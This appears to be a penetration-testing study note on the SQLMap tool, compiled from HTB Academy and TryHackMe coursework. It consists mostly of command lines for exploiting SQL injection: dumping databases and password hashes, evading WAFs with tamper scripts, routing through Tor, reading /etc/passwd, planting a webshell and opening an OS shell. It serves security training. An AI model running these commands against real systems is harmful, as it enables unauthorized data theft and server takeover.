---
title: "SQLMap"
type: tool
tags: [exploitation, htb, scanner, thm, tool, web]
date_created: 2026-05-08
date_updated: 2026-05-08
sources: [cpts-sqlmap, thm-sqlmap]
phase: exploit
---

## Purpose

SQLMap is an open-source Python tool that automates detection and exploitation of SQL injection vulnerabilities, supporting all major database backends and injection techniques.

## Install / Setup

```bash
sudo apt install sqlmap

# Latest dev version
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
python sqlmap-dev/sqlmap.py -h
```

## Core Usage

### Basic detection

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1"          # GET parameter
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch  # non-interactive, accept defaults
```

### POST requests

```bash
sqlmap -u "http://www.example.com/" --data "uid=1&name=test"
sqlmap -u "http://www.example.com/" --data "uid=1*&name=test"   # mark injection point with *
```

### Request file (from Burp)

Save the raw HTTP request to a file, then:

```bash
sqlmap -r req.txt
sqlmap -r req.txt -p id          # test specific parameter
```

Mark the injection point inside the request file with `*`:

```
GET /?id=* HTTP/1.1
Host: www.example.com
```

### Converting a curl command

Copy as cURL from browser DevTools, replace `curl` with `sqlmap`:

```bash
sqlmap 'http://www.example.com/?id=1' \
  -H 'User-Agent: Mozilla/5.0 ...' \
  -H 'Cookie: PHPSESSID=abc123'
```

### Custom headers and cookies

```bash
sqlmap -u URL --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
sqlmap -u URL -H 'Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
sqlmap -u URL --cookie="id=1*"   # inject inside a cookie value
sqlmap -u URL --random-agent     # randomise User-Agent
sqlmap -u URL --mobile           # use smartphone User-Agent
sqlmap -u URL --method PUT       # non-standard HTTP method
```

## DB Enumeration

### Basic DB info

```bash
sqlmap -u URL --banner           # DBMS version
sqlmap -u URL --current-user     # current DB user
sqlmap -u URL --current-db       # current database
sqlmap -u URL --is-dba           # check if DBA privileges
sqlmap -u URL --banner --current-user --current-db --is-dba   # all at once
sqlmap -u URL --dbs              # list all databases
sqlmap -u URL --passwords        # dump DBMS user password hashes (auto-cracks)
```

### Tables and columns

```bash
sqlmap -u URL --tables -D testdb                        # list tables in database
sqlmap -u URL --columns -T users -D testdb              # list columns in table
sqlmap -u URL --schema                                  # full DB schema (all tables)
sqlmap -u URL --dump -T users -D testdb                 # dump table
sqlmap -u URL --dump -T users -D testdb -C name,surname # specific columns only
sqlmap -u URL --dump -T users -D testdb --start=2 --stop=3  # row range
sqlmap -u URL --dump -T users -D testdb --where="name LIKE 'f%'"  # WHERE filter
sqlmap -u URL --dump -D testdb                          # dump entire database
sqlmap -u URL --dump-all --exclude-sysdbs               # dump all non-system DBs
```

### Searching

```bash
sqlmap -u URL --search -T user   # find tables matching 'user' (LIKE)
sqlmap -u URL --search -C pass   # find columns matching 'pass'
```

## WAF Bypass and Advanced Options

### Level and risk

```bash
# --level 1-5 (default 1): increases boundaries/payloads
# --risk  1-3 (default 1): increases risk of side effects (e.g. OR-based payloads)
sqlmap -u URL --level=5 --risk=3
```

Default level 1, risk 1: ~72 payloads. Level 5, risk 3: ~7865 payloads.

### Technique selection

```bash
# B=boolean-blind E=error U=union S=stacked T=time-blind Q=inline
sqlmap -u URL --technique=BEU    # skip time-based and stacked
```

### Tamper scripts

```bash
sqlmap -u URL --tamper=between                        # replace > and = with BETWEEN
sqlmap -u URL --tamper=randomcase                     # randomise keyword case
sqlmap -u URL --tamper=space2comment                  # replace spaces with /**/
sqlmap -u URL --tamper=between,randomcase             # chain multiple tampers
sqlmap -u URL --list-tampers                          # show all available tampers
```

Notable tamper scripts:

| Tamper | Effect |
|---|---|
| `between` | Replaces `>` with `NOT BETWEEN 0 AND #`, `=` with `BETWEEN # AND #` |
| `randomcase` | Randomises keyword case (`SELECT` → `SEleCt`) |
| `space2comment` | Replaces spaces with `/**/` |
| `base64encode` | Base64-encodes the full payload |
| `versionedmorekeywords` | Wraps each keyword in MySQL versioned comments |
| `modsecurityversioned` | Wraps full query in MySQL versioned comment |
| `percentage` | Adds `%` prefix to each character (`SELECT` → `%S%E%L%E%C%T`) |

### User-agent and WAF detection

```bash
sqlmap -u URL --random-agent     # avoid default sqlmap UA blacklisting
sqlmap -u URL --skip-waf         # skip WAF detection heuristic
```

### CSRF token bypass

```bash
sqlmap -u URL --data="id=1&csrf-token=abc123" --csrf-token="csrf-token"
```

### Proxy routing

```bash
sqlmap -u URL --proxy="socks4://177.39.187.70:33283"
sqlmap -u URL --proxy-file proxies.txt    # rotate through list
sqlmap -u URL --tor                       # route through Tor (SOCKS4 on 9050)
sqlmap -u URL --check-tor                 # verify Tor is working
```

### Routing through Burp for debugging

```bash
sqlmap -u URL --proxy="http://127.0.0.1:8080"
```

### Other tuning flags

```bash
sqlmap -u URL --prefix="%'))" --suffix="-- -"   # custom payload boundaries
sqlmap -u URL --union-cols=17                    # hint column count for UNION
sqlmap -u URL --string=success                   # use string to distinguish TRUE/FALSE
sqlmap -u URL --code=200                         # use HTTP code to distinguish
sqlmap -u URL --text-only                        # compare only visible text
sqlmap -u URL --randomize=rp                     # randomise parameter to bypass unique-value checks
sqlmap -u URL --eval="import hashlib; h=hashlib.md5(id).hexdigest()"  # computed param
sqlmap -u URL --chunked                          # chunked POST to split keywords
```

## OS Interaction

```bash
# OS shell (requires FILE privilege and stacked queries or error-based)
sqlmap -u URL -p email --os-shell

# File read
sqlmap -u URL --file-read="/etc/passwd"

# File write (upload webshell)
sqlmap -u URL --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"
```

## Debugging and Output

```bash
sqlmap -u URL --parse-errors       # print DBMS errors in output
sqlmap -u URL -t /tmp/traffic.txt  # save all HTTP traffic to file
sqlmap -u URL -v 3                 # verbosity (0-6); -v 3 shows payloads
sqlmap -u URL -v 6 --batch         # full debug output
```

Output/sessions are saved in `~/.sqlmap/output/<target>/`.

## THM — OS Shell via SQLi

Demonstrates getting an OS shell via a vulnerable login endpoint:

```bash
sqlmap -u "http://TARGET_IP/ai/includes/user_login.php?email=test%40chatai.com&password=123" \
  -p email --os-shell
```

## Tips and Gotchas

- Use `--batch` in automated pipelines to avoid interactive prompts (accepts defaults).
- Marking a specific parameter with `*` (e.g., `uid=1*`) focuses sqlmap on that parameter instead of testing all.
- `--dump` auto-recognises password hashes and offers dictionary-based cracking with a built-in 1.4M wordlist.
- `-r req.txt` is the cleanest way to handle complex requests with unusual headers or JSON/XML bodies.
- `--technique=T` (time-based only) is slower but works when blind injection is the only option on non-query statements (`INSERT`, `UPDATE`).
- `--os-shell` requires `FILE` privilege and a writable web directory; it uses stacked queries or error-based injection.
- Raising `--level` and `--risk` above defaults significantly slows the scan; start with defaults and escalate if needed.
- SQLMap's default User-Agent (`sqlmap/1.x`) is blocked by many WAFs; always use `--random-agent` for real assessments.
- `--all --batch` dumps everything accessible automatically; useful for CTFs but very slow and noisy.

## Related Techniques

- [[sql-injection]]
- [[wiki/cheatsheets/recon]]
- [[path-traversal-lfi]]

## Sources

- CPTS SQLMap Essentials module (HTB Academy)
- TryHackMe: Weaponizing Vulnerabilities MySQL
- Source files: `/raw/assets/courses/CPTS/17. SQLMap/`, `/raw/assets/courses/TryHackMe/6. THM tools/Linux/sqlmap/`
